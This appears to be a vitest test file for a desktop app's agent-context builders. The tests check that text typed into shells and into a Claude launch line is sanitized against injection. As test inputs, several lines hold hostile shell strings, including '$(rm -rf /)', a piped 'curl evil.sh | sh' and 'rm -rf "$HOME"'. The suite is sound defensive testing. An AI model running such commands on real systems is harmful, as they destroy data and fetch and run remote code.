// Agent context tests (T8 / A4) — the two honest injection seams.
//
// These builders produce bytes that are TYPED INTO A SHELL, one of them
// embedding user-authored pin notes, so the sanitization cases below are the
// point of this suite, not a formality:
//   - a newline in a typed line IS an Enter (sending on the user's behalf)
//   - a `"` closes the launch line's quoted --append-system-prompt argument
//   - `$(...)`, backticks, `%VAR%` are command/variable substitution in the
//     three shells this app types into (POSIX, PowerShell, cmd)
// Everything here is pure — no store, no IPC, no DOM.

import { describe, it, expect } from "vitest";
import type { Artifact } from "../types";
import {
  PIN_NOTE_MAX,
  REF_MAX,
  SEND_REFERENCE_MAX,
  SPAWN_CONTEXT_MAX,
  TRANSCRIPT_SUFFIX,
  DECISION_LABELS_NAMED,
  DECISION_LABEL_MAX,
  artifactRef,
  buildBacklogItemLine,
  buildPageContractLine,
  buildSendReference,
  buildSpawnContext,
  getKbRootForContext,
  refOptions,
  sanitizeForTypedLine,
  sessionTranscriptPath,
  setKbRootForContext,
} from "./agentContext";
import { launchCommand } from "./threadStore";

const KB_ROOT = "C:/Users/eric/projects/personal-kb";

const DOC: Artifact = {
  kind: "kb-doc",
  path: "switchboard/features/artifact-panel/requirements.md",
};

const REPO_FILE: Artifact = { kind: "repo-file", project: "switchboard", path: "src/App.tsx" };

const SESSION: Artifact = { kind: "session", sessionId: "s-42" };

const SCROLLBACK = { scrollbackRoot: "C:/Users/eric/AppData/Local/switchboard/scrollback" };

/** Every hostile construct in one string. */
const NASTY = 'say "hi" `whoami` $(rm -rf /) $HOME %USERPROFILE% back\\slash\nsecond line';

/** No typed line may contain any of these — see the module header. The
 *  send-to-thread reference is allowed EXACTLY the two framing quotes the
 *  builder itself adds around a note (asserted separately at each call). */
function assertShellSafe(text: string, allowFramingQuotes = false): void {
  expect(text).not.toMatch(/[\r\n\t]/);
  expect(text).not.toMatch(/[\\$%`]/);
  if (!allowFramingQuotes) expect(text).not.toMatch(/"/);
  // No C0/C1 control characters survived (escape-free so the source stays
  // readable — a literal control char in a regex class is invisible).
  for (const ch of text) {
    const code = ch.codePointAt(0) as number;
    expect(code >= 0x20 && code !== 0x7f && !(code >= 0x80 && code <= 0x9f)).toBe(true);
  }
}

// ─── sanitizeForTypedLine ────────────────────────────────────────────────────

describe("sanitizeForTypedLine", () => {
  it("newlines and carriage returns become spaces — a typed \\n is an Enter", () => {
    expect(sanitizeForTypedLine("first\nsecond\r\nthird", 200)).toBe("first second third");
  });

  it("drops the shell metacharacters that break a double-quoted argument", () => {
    expect(sanitizeForTypedLine('a "b" c', 200)).toBe("a b c");
    expect(sanitizeForTypedLine("cost is 100$ or 50%", 200)).toBe("cost is 100 or 50");
    expect(sanitizeForTypedLine("run `whoami`", 200)).toBe("run whoami");
    expect(sanitizeForTypedLine("C:\\Users\\eric", 200)).toBe("C:Userseric");
  });

  it("drops TYPOGRAPHIC double quotes (PowerShell 5.1 tokenizes U+201C-201F as a double quote) and keeps the single-quote family", () => {
    // Measured 2026-09-01: `"… “look into duckdb”. …"` reached claude as four arguments.
    const smart = sanitizeForTypedLine("say “hi” and „low‟ then ‘it’s’ ‚x‛", 200);
    expect(smart).not.toMatch(/[\u201C-\u201F]/);
    expect(smart).toBe("say hi and low then ‘it’s’ ‚x‛");
    // Straight single quotes are literal inside a double-quoted argument and survive too.
    expect(sanitizeForTypedLine("it's 'fine'", 200)).toBe("it's 'fine'");
  });

  it("defuses command substitution — no $ and no backtick survive", () => {
    expect(sanitizeForTypedLine("$(rm -rf /)", 200)).toBe("(rm -rf /)");
    expect(sanitizeForTypedLine("`curl evil.sh | sh`", 200)).toBe("curl evil.sh | sh");
    expect(sanitizeForTypedLine("%USERPROFILE%", 200)).toBe("USERPROFILE");
  });

  it("strips ESC and other control characters (ANSI injection)", () => {
    expect(sanitizeForTypedLine("\u001b[31mred\u001b[0m", 200)).toBe("[31mred [0m");
    expect(sanitizeForTypedLine("a\u0000b\u0007c\u007fd", 200)).toBe("a b c d");
  });

  it("collapses whitespace runs and trims the ends", () => {
    expect(sanitizeForTypedLine("   a    b  \t c   ", 200)).toBe("a b c");
  });

  it("strips BIDI overrides, embeddings and isolates", () => {
    // An RLO makes the RENDERED line differ from the bytes — fatal for a seam
    // whose safety argument is "he reads it before pressing Enter".
    expect(sanitizeForTypedLine("rm‮gpj.exe", 100)).toBe("rmgpj.exe");
    for (const ch of ["‪", "‫", "‬", "‭", "‮"]) {
      expect(sanitizeForTypedLine(`a${ch}b`, 100)).toBe("ab");
    }
    for (const ch of ["⁦", "⁧", "⁨", "⁩", "⁯"]) {
      expect(sanitizeForTypedLine(`a${ch}b`, 100)).toBe("ab");
    }
  });

  it("strips zero-width characters, directional marks and the BOM", () => {
    for (const ch of ["​", "‌", "‍", "‎", "‏", "﻿"]) {
      expect(sanitizeForTypedLine(`a${ch}b`, 100)).toBe("ab");
    }
    // Word joiner + the invisible math operators.
    for (const ch of ["⁠", "⁡", "⁢", "⁣", "⁤"]) {
      expect(sanitizeForTypedLine(`a${ch}b`, 100)).toBe("ab");
    }
  });

  it("strips LONE surrogates (malformed UTF-16 the IPC layer would reject)", () => {
    expect(sanitizeForTypedLine("a\uD800b", 100)).toBe("ab"); // lone high
    expect(sanitizeForTypedLine("a\uDFFFb", 100)).toBe("ab"); // lone low
    expect(sanitizeForTypedLine("a\uDC00\uD83D b", 100)).toBe("a b"); // reversed pair
  });

  it("keeps unicode — accents, CJK, emoji", () => {
    expect(sanitizeForTypedLine("café 日本語 ✅", 200)).toBe("café 日本語 ✅");
  });

  it("caps length by CODE POINT and marks the cut, never splitting a surrogate pair", () => {
    const long = "x".repeat(500);
    const cut = sanitizeForTypedLine(long, 20);
    expect(Array.from(cut)).toHaveLength(20);
    expect(cut.endsWith("…")).toBe(true);

    const emoji = "🙂".repeat(50);
    const emojiCut = sanitizeForTypedLine(emoji, 10);
    expect(Array.from(emojiCut)).toHaveLength(10);
    // A split surrogate would leave a lone \uD83D — assert none survived.
    expect(/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(emojiCut)).toBe(false);
  });

  it("is idempotent (re-sanitizing at the launch-line seam is free)", () => {
    const once = sanitizeForTypedLine(NASTY, 500);
    expect(sanitizeForTypedLine(once, 500)).toBe(once);
  });

  it("neutralizes the whole nasty string", () => {
    assertShellSafe(sanitizeForTypedLine(NASTY, 500));
  });

  it("non-string / empty input degrades to empty", () => {
    expect(sanitizeForTypedLine("", 200)).toBe("");
    expect(sanitizeForTypedLine("   ", 200)).toBe("");
    expect(sanitizeForTypedLine(undefined as unknown as string, 200)).toBe("");
    expect(sanitizeForTypedLine("abc", 0)).toBe("");
  });
});

// ─── artifactRef ─────────────────────────────────────────────────────────────

describe("artifactRef", () => {
  it("kb-doc without a known root → KB-relative", () => {
    expect(artifactRef(DOC)).toBe("kb switchboard/features/artifact-panel/requirements.md");
  });

  it("kb-doc with the KB root → absolute (a thread's cwd is a REPO, not the KB)", () => {
    expect(artifactRef(DOC, { kbRoot: KB_ROOT })).toBe(
      "kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md"
    );
  });

  it("normalizes Windows separators BEFORE the backslash drop", () => {
    expect(artifactRef(DOC, { kbRoot: "C:\\Users\\eric\\projects\\personal-kb\\" })).toBe(
      "kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md"
    );
    expect(artifactRef({ kind: "repo-file", project: "switchboard", path: "src\\App.tsx" })).toBe(
      "repo switchboard/src/App.tsx"
    );
  });

  it("repo-file → project + relative path", () => {
    expect(artifactRef(REPO_FILE)).toBe("repo switchboard/src/App.tsx");
  });

  it("localhost (phase B kind) still names itself", () => {
    expect(
      artifactRef({ kind: "localhost", project: "orbit", url: "http://localhost:5173" })
    ).toBe("localhost orbit http://localhost:5173");
  });

  it("caps an absurd path", () => {
    const ref = artifactRef({ kind: "kb-doc", path: `${"deep/".repeat(200)}doc.md` });
    expect(Array.from(ref).length).toBeLessThanOrEqual(REF_MAX);
  });

  it("a view ref names the spec file; a block child (SWIT-73) adds the fence block", () => {
    const THREADS = { threadsRoot: "C:/Users/eric/AppData/Local/switchboard/threads" };
    expect(artifactRef({ kind: "view", threadId: "t1", viewId: "v1" }, THREADS)).toBe(
      "view C:/Users/eric/AppData/Local/switchboard/threads/t1/views/v1.json"
    );
    expect(
      artifactRef(
        { kind: "view", threadId: "t1", viewId: "r1", block: 3, drill: { key: "m-9" } },
        THREADS
      )
    ).toBe("view C:/Users/eric/AppData/Local/switchboard/threads/t1/views/r1.json block 3 drill m-9");
  });
});

// ─── buildSpawnContext (seam 1) ──────────────────────────────────────────────

describe("buildSpawnContext", () => {
  it("no artifact → null (the caller omits the flag entirely)", () => {
    expect(buildSpawnContext(null, 0)).toBeNull();
    expect(buildSpawnContext(null, 3, { kbRoot: KB_ROOT })).toBeNull();
  });

  it("pinned kb doc → the architecture's one-liner", () => {
    expect(buildSpawnContext(DOC, 3)).toBe(
      "Workstation context: panel shows kb switchboard/features/artifact-panel/requirements.md (3 pins in .pins.json alongside)."
    );
  });

  it("resolves the doc absolutely when the KB root is known", () => {
    expect(buildSpawnContext(DOC, 3, { kbRoot: KB_ROOT })).toBe(
      "Workstation context: panel shows kb C:/Users/eric/projects/personal-kb/switchboard/features/artifact-panel/requirements.md (3 pins in .pins.json alongside)."
    );
  });

  it("one pin is singular; zero pins drop the clause", () => {
    expect(buildSpawnContext(DOC, 1)).toContain("(1 pin in .pins.json alongside)");
    expect(buildSpawnContext(DOC, 0)).toBe(
      "Workstation context: panel shows kb switchboard/features/artifact-panel/requirements.md."
    );
  });

  it("repo-file needs no pin clause", () => {
    expect(buildSpawnContext(REPO_FILE, 0)).toBe(
      "Workstation context: panel shows repo switchboard/src/App.tsx."
    );
  });

  it("garbage pin counts degrade to none", () => {
    expect(buildSpawnContext(DOC, NaN)).not.toContain("pin");
    expect(buildSpawnContext(DOC, -4)).not.toContain("pin");
    expect(buildSpawnContext(DOC, 2.7)).toContain("(2 pins");
  });

  it("a hostile path can never break the quoted argument", () => {
    const context = buildSpawnContext(
      { kind: "kb-doc", path: `evil"; ${NASTY}/doc.md` },
      2,
      { kbRoot: KB_ROOT }
    );
    expect(context).not.toBeNull();
    assertShellSafe(context as string);
  });

  it("stays inside the spawn cap", () => {
    const context = buildSpawnContext({ kind: "kb-doc", path: "a/".repeat(5000) }, 9);
    expect(Array.from(context as string).length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
  });
});

// ─── buildSendReference (seam 2) ─────────────────────────────────────────────

describe("buildSendReference", () => {
  it("no pin → just the artifact", () => {
    expect(buildSendReference(DOC)).toBe(
      'Look at "kb switchboard/features/artifact-panel/requirements.md"'
    );
    expect(buildSendReference(REPO_FILE)).toBe('Look at "repo switchboard/src/App.tsx"');
  });

  it("with a pin → number + quoted note", () => {
    expect(buildSendReference(DOC, { number: 2, note: "the CTA is below the fold" })).toBe(
      'Look at "kb switchboard/features/artifact-panel/requirements.md", pin 2: "the CTA is below the fold"'
    );
  });

  it("an empty note drops the NOTE's quotes rather than typing an empty pair", () => {
    expect(buildSendReference(DOC, { number: 4, note: "" })).toBe(
      'Look at "kb switchboard/features/artifact-panel/requirements.md", pin 4'
    );
    expect(buildSendReference(DOC, { number: 4, note: "   \n  " })).toBe(
      'Look at "kb switchboard/features/artifact-panel/requirements.md", pin 4'
    );
  });

  it("the REF is quoted, so shell syntax in a filename is inert at a bare prompt", () => {
    // `; | & ' < >` are legal in a filename and are NOT on the drop list (that
    // list is calibrated for text inside a quoted argument). Unquoted, this
    // line ran two commands if Enter was pressed at a shell prompt.
    const line = buildSendReference({ kind: "kb-doc", path: "notes & calc; ls.md" });
    expect(line).toBe('Look at "kb notes & calc; ls.md"');
    // Everything after `Look at ` is inside OUR quotes, and there are exactly
    // two of them — the path could not have closed the pair early.
    expect((line.match(/"/g) ?? []).length).toBe(2);
    expect(line.startsWith('Look at "')).toBe(true);
    expect(line.endsWith('"')).toBe(true);
  });

  it("a hostile PATH cannot break out of the ref's quotes either", () => {
    const line = buildSendReference({ kind: "kb-doc", path: NASTY });
    expect((line.match(/"/g) ?? []).length).toBe(2);
    assertShellSafe(line, true);
  });

  it("NEVER ends in a newline — a trailing \\n would send the message", () => {
    for (const note of ["fine", NASTY, "trailing\n", "\n\n\n", "x".repeat(900)]) {
      const line = buildSendReference(DOC, { number: 1, note });
      expect(line.endsWith("\n")).toBe(false);
      expect(line.endsWith("\r")).toBe(false);
      expect(line.split("\n")).toHaveLength(1);
    }
  });

  it("a hostile note cannot break out of OUR quotes", () => {
    const line = buildSendReference(DOC, { number: 7, note: NASTY }, { kbRoot: KB_ROOT });
    // Exactly the two pairs WE added — one around the ref, one around the
    // note — and nothing else: their own quotes are gone, so neither can
    // terminate ours early.
    expect((line.match(/"/g) ?? []).length).toBe(4);
    expect(line.endsWith('"')).toBe(true);
    assertShellSafe(line, true);
    expect(line).toContain("pin 7: ");
  });

  it("truncates a runaway note and marks the cut", () => {
    const line = buildSendReference(DOC, { number: 1, note: "y".repeat(4000) });
    const note = line.slice(line.indexOf('pin 1: "') + 8, -1);
    expect(Array.from(note)).toHaveLength(PIN_NOTE_MAX);
    expect(note.endsWith("…")).toBe(true);
  });

  it("keeps unicode notes intact", () => {
    expect(buildSendReference(DOC, { number: 1, note: "レイアウト崩れ 🙃" })).toContain(
      'pin 1: "レイアウト崩れ 🙃"'
    );
  });

  it("clamps nonsense pin numbers instead of printing them", () => {
    expect(buildSendReference(DOC, { number: 0, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: -3, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: NaN, note: "n" })).toContain("pin 1:");
    expect(buildSendReference(DOC, { number: 1e21, note: "n" })).toContain("pin 9999:");
    expect(buildSendReference(DOC, { number: 3.9, note: "n" })).toContain("pin 3:");
  });

  it("stays inside the derived bound for any input", () => {
    const line = buildSendReference(
      { kind: "kb-doc", path: "deep/".repeat(400) },
      { number: 9999, note: "z".repeat(5000) },
      { kbRoot: "C:/".padEnd(400, "x") }
    );
    expect(Array.from(line).length).toBeLessThanOrEqual(SEND_REFERENCE_MAX);
  });
});

// ─── KB root cache ───────────────────────────────────────────────────────────

describe("kb root cache", () => {
  it("round-trips, treats empty as unresolved, and feeds refOptions", () => {
    setKbRootForContext(null);
    expect(getKbRootForContext()).toBeNull();
    expect(refOptions().kbRoot).toBeNull();

    setKbRootForContext("");
    expect(getKbRootForContext()).toBeNull();

    setKbRootForContext(KB_ROOT);
    expect(refOptions().kbRoot).toBe(KB_ROOT);
    expect(buildSendReference(DOC, null, refOptions())).toContain(KB_ROOT);

    setKbRootForContext(null); // leave the module clean for other suites
  });
});

// ─── panel terminals (the live-shell linkage, 2026-08-02) ────────────────────
// A running shell is not a document, so both seams used to say nothing about
// one. What they CAN honestly name is its transcript mirror, and these are the
// rules that keep that honest: no root → no ref (the pre-linkage silence), the
// path is quoted by us and survives sanitizing, and the wording says the file
// is a snapshot to be re-read rather than the process itself.

describe("session artifacts", () => {
  it("no scrollback root → no ref, so both seams stay silent", () => {
    expect(artifactRef(SESSION)).toBe("");
    expect(buildSpawnContext(SESSION, 0)).toBeNull();
    expect(buildSendReference(SESSION)).toBe("");
  });

  it("with a root → the ref names the transcript file", () => {
    expect(artifactRef(SESSION, SCROLLBACK)).toBe(
      "terminal C:/Users/eric/AppData/Local/switchboard/scrollback/s-42.transcript.txt"
    );
  });

  it("sessionTranscriptPath is the shared path rule", () => {
    expect(sessionTranscriptPath("s-42", SCROLLBACK)).toBe(
      "C:/Users/eric/AppData/Local/switchboard/scrollback/s-42.transcript.txt"
    );
    expect(sessionTranscriptPath("s-42", {})).toBe("");
    expect(sessionTranscriptPath("", SCROLLBACK)).toBe("");
  });

  it("names the PLAIN-TEXT transcript, never the ANSI restore mirror", () => {
    // `<id>.txt` is an xterm serialize (escape sequences) — the wrong file to
    // hand an agent. This pairing is duplicated in lib.rs; if it drifts, the
    // reference points at a file nothing writes.
    expect(TRANSCRIPT_SUFFIX).toBe(".transcript.txt");
    const path = sessionTranscriptPath("s-42", SCROLLBACK);
    expect(path.endsWith(TRANSCRIPT_SUFFIX)).toBe(true);
    expect(path.endsWith("/s-42.txt")).toBe(false);
  });

  it("normalizes a Windows root — backslashes would be stripped by the sanitizer", () => {
    expect(
      sessionTranscriptPath("s-42", { scrollbackRoot: "C:\\Users\\eric\\AppData\\scrollback" })
    ).toBe("C:/Users/eric/AppData/scrollback/s-42.transcript.txt");
  });

  it("the send line names the FILE and says what it is — quotes survive", () => {
    const line = buildSendReference(SESSION, null, { ...SCROLLBACK, sessionName: "lodestar" });
    expect(line).toBe(
      'Read "C:/Users/eric/AppData/Local/switchboard/scrollback/s-42.transcript.txt" — ' +
        "the output of the live terminal lodestar in my panel"
    );
    expect(line.length).toBeLessThanOrEqual(SEND_REFERENCE_MAX);
  });

  it("an unnamed shell falls back to `terminal`, never to an empty name", () => {
    expect(buildSendReference(SESSION, null, SCROLLBACK)).toContain("live terminal terminal");
    expect(
      buildSendReference(SESSION, null, { ...SCROLLBACK, sessionName: "   " })
    ).toContain("live terminal terminal");
  });

  it("a hostile tab name cannot break the line it is typed into", () => {
    const line = buildSendReference(SESSION, null, { ...SCROLLBACK, sessionName: NASTY });
    expect(line).not.toMatch(/[\r\n]/);
    expect(line).not.toMatch(/[`$%\\]/);
    // Exactly our own pair of quotes around the path, none from the name.
    expect((line.match(/"/g) ?? []).length).toBe(2);
  });

  it("the spawn one-liner describes a RUNNING shell, not a document", () => {
    const context = buildSpawnContext(SESSION, 0, {
      ...SCROLLBACK,
      sessionName: "lodestar",
    }) as string;
    expect(context).toContain("a live terminal named lodestar is running");
    expect(context).toContain("scrollback/s-42.transcript.txt");
    // It must tell the agent the file is a snapshot — that is the whole
    // honesty of naming a file instead of the process.
    expect(context).toContain("re-read");
    expect(context).not.toContain("panel shows");
    expect(context.length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
  });

  it("never claims pins — a shell has no sidecar", () => {
    const context = buildSpawnContext(SESSION, 7, SCROLLBACK) as string;
    expect(context).not.toContain("pin");
  });

  it("survives the launch line's own quoting", () => {
    const context = buildSpawnContext(SESSION, 0, SCROLLBACK) as string;
    expect(launchCommand({ chatSessionId: "abc-123", resume: false, appendSystemPrompt: context }))
      .toBe(`claude --session-id abc-123 --append-system-prompt "${context}"`);
  });
});

// ─── launch-line seam ────────────────────────────────────────────────────────
// The flag is appended by threadStore.launchCommand — the ONE launch-line
// builder — so create and revive cannot drift apart.

describe("launchCommand + spawn context", () => {
  it("no context → the launch line is byte-identical to before A4", () => {
    expect(launchCommand({ chatSessionId: "abc-123", resume: false })).toBe(
      "claude --session-id abc-123"
    );
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: null })).toBe(
      "claude --resume abc-123"
    );
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: "  " })).toBe(
      "claude --resume abc-123"
    );
  });

  it("context → one double-quoted --append-system-prompt argument", () => {
    const context = buildSpawnContext(DOC, 3) as string;
    expect(launchCommand({ chatSessionId: "abc-123", resume: true, appendSystemPrompt: context })).toBe(
      `claude --resume abc-123 --append-system-prompt "${context}"`
    );
  });

  it("re-sanitizes defensively — a raw caller cannot escape the quotes", () => {
    const line = launchCommand({
      chatSessionId: "abc-123",
      resume: false,
      appendSystemPrompt: `ctx "; ${NASTY}`,
    });
    expect(line.startsWith('claude --session-id abc-123 --append-system-prompt "')).toBe(true);
    expect(line.endsWith('"')).toBe(true);
    // The two framing quotes are the only ones in the line, and the whole line
    // is still a single typed line.
    expect((line.match(/"/g) ?? []).length).toBe(2);
    expect(line.split("\n")).toHaveLength(1);
  });
});

// ─── Anchored pins + surfaces (Inc 3d — SWIT-38) ─────────────────────────────

describe("buildPageContractLine + standing decisions (SWIT-58)", () => {
  it("with no decisions the line is the page contract alone — one line, no clause", () => {
    const line = buildPageContractLine();
    expect(line).toContain("This thread has a PAGE");
    expect(line).not.toContain("decision");
    expect(buildPageContractLine(null)).toBe(line);
    expect(buildPageContractLine({ count: 0, labels: [] })).toBe(line);
    expect(line.split("\n")).toHaveLength(1);
  });

  it("names the count and the newest three labels, plain text", () => {
    const line = buildPageContractLine({ count: 5, labels: ["per-market", "no", "keep it", "fourth", "fifth"] });
    expect(line).toContain("already made 5 decisions on this page");
    expect(line).toContain("the newest: per-market; no; keep it");
    expect(line).not.toContain("fourth");
    expect(line).toContain("do not re-ask");
    expect(buildPageContractLine({ count: 1, labels: ["x"] })).toContain("1 decision on");
    expect(DECISION_LABELS_NAMED).toBe(3);
  });

  it("labels are sanitized for the typed line and capped individually", () => {
    const hostile = 'say "hi"\n$(rm -rf /) `x` %PATH%';
    const line = buildPageContractLine({ count: 1, labels: [hostile] });
    expect(line).not.toMatch(/["\\$%`\n]/);
    expect(line).toContain("say hi (rm -rf /) x PATH");
    const long = "w".repeat(DECISION_LABEL_MAX * 3);
    const cut = buildPageContractLine({ count: 2, labels: [long, "second"] });
    expect(cut).toContain("…; second");
    expect(cut.length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
    // An all-junk label vanishes and the count still speaks.
    expect(buildPageContractLine({ count: 1, labels: ['"""'] })).toContain("tagged decision:)");
  });
});

describe("anchored pin references + surface spawn context (3d)", () => {
  const SURFACE: Artifact = { kind: "surface", project: "lodestar", page: "trading" };

  it("an anchored pin says WHAT it is on: (anchor — label) before the note", () => {
    expect(
      buildSendReference(DOC, { number: 2, note: "is this the same 30m?", anchor: "table:1:row:2", label: "table 1 · 30m" })
    ).toBe(
      'Look at "kb switchboard/features/artifact-panel/requirements.md", pin 2 (table:1:row:2 — table 1 · 30m): "is this the same 30m?"'
    );
  });

  it("a label equal to the key is not repeated; an empty note keeps the anchor clause", () => {
    expect(buildSendReference(SURFACE, { number: 1, note: "", anchor: "trade:t1", label: "trade:t1" })).toBe(
      'Look at "surface lodestar/trading", pin 1 (trade:t1)'
    );
  });

  it("a hostile anchor/label cannot break the line", () => {
    const line = buildSendReference(SURFACE, { number: 3, note: "n", anchor: `row:${NASTY}`, label: NASTY });
    expect(line.split("\n")).toHaveLength(1);
    expect((line.match(/"/g) ?? []).length).toBe(4); // ref pair + note pair only
    expect(Array.from(line).length).toBeLessThanOrEqual(SEND_REFERENCE_MAX);
  });

  it("a surface spawn context names its pins file by path and says how to add a pin", () => {
    const line = buildSpawnContext(SURFACE, 2, { kbRoot: KB_ROOT });
    expect(line).toContain('panel shows surface lodestar/trading');
    expect(line).toContain(`2 pins in ${KB_ROOT}/lodestar/surface-pins.json`);
    expect(line).toContain("origin: thread");
    expect(line).toContain("doc: trading");
    expect(line?.split("\n")).toHaveLength(1);
    // Zero pins still names the file — the agent needs it to ADD one.
    expect(buildSpawnContext(SURFACE, 0, { kbRoot: KB_ROOT })).toContain(`pins file ${KB_ROOT}/lodestar/surface-pins.json`);
  });
});

// ─── SWIT-64: the backlog-item sentence ──────────────────────────────────────

describe("backlog item spawn context (SWIT-64)", () => {
  const ITEM = { id: "bmf1x2a01", text: "look at duckdb for the tennis table" };

  it("stands ALONE when the tab has no panel, names the id, frames the text, points at the tool", () => {
    const line = buildSpawnContext(null, 0, { backlogItem: ITEM });
    expect(line).toBe(
      "You were opened from backlog item bmf1x2a01: 'look at duckdb for the tennis table'. Start there. " +
        "If you create a ticket or a spec for it, record it with the backlog tool (op link, itemId bmf1x2a01)."
    );
    expect(buildBacklogItemLine(ITEM)).toBe(line);
  });

  it("rides AFTER the panel clause when there is one; no item → the panel line is unchanged", () => {
    const withItem = buildSpawnContext(DOC, 2, { kbRoot: KB_ROOT, backlogItem: ITEM }) as string;
    const without = buildSpawnContext(DOC, 2, { kbRoot: KB_ROOT }) as string;
    expect(withItem.startsWith(without)).toBe(true);
    expect(withItem).toContain(" You were opened from backlog item bmf1x2a01");
    expect(buildSpawnContext(DOC, 2, { kbRoot: KB_ROOT, backlogItem: null })).toBe(without);
    expect(withItem.split("\n")).toHaveLength(1);
  });

  it("is SANITIZED like every typed line: quotes, metachars, newlines and a bad id cannot break out", () => {
    const line = buildSpawnContext(null, 0, {
      backlogItem: { id: "x1", text: 'rm -rf "$HOME"\n`whoami` %PATH% \\ ok' },
    }) as string;
    expect(line).not.toMatch(/["\\$%`\n\r]/);
    expect(line).toContain("'rm -rf HOME whoami PATH ok'");
    // Smart quotes in the item text cannot re-open the split: they are gone.
    const smart = buildSpawnContext(null, 0, { backlogItem: { id: "x2", text: "“look into duckdb”" } }) as string;
    expect(smart).toContain("x2: 'look into duckdb'. Start there.");
    expect(smart).not.toMatch(/[“-‟]/);
    // An id that is not id-alphabet is dropped, and with it the sentence —
    // a link instruction naming a fake id would send the agent nowhere.
    expect(buildSpawnContext(null, 0, { backlogItem: { id: "../x y", text: "t" } })).toBeNull();
    expect(buildSpawnContext(null, 0, { backlogItem: { id: "ok", text: "   " } })).toBeNull();
    // Long text is capped by code point with an ellipsis; the tool clause survives.
    const long = buildSpawnContext(null, 0, { backlogItem: { id: "ok", text: "é".repeat(2000) } }) as string;
    expect(long).toContain("…'. Start there.");
    expect(long).toContain("(op link, itemId ok)");
    expect(Array.from(long).length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
  });
});
